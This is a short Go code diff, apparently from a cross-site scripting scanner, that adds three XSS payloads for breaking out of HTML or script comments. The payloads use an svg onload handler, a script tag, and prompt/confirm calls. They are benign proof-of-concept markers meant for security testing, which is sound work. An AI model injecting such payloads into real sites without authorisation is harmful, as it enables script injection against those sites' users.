@@ -362,7 +362,9 @@ func getHTMLPayload(ip string) []string {
 		}
 	}
 	if strings.Contains(ip, "comment") {
-		// TODO add comment payloads
+		payload = append(payload, "--><svg/onload=alert(DALFOX_ALERT_VALUE)>")
+		payload = append(payload, "--><script>confirm(DALFOX_ALERT_VALUE)</script>")
+		payload = append(payload, "*/prompt(DALFOX_ALERT_VALUE)/*")
 	}
 	return payload
 }
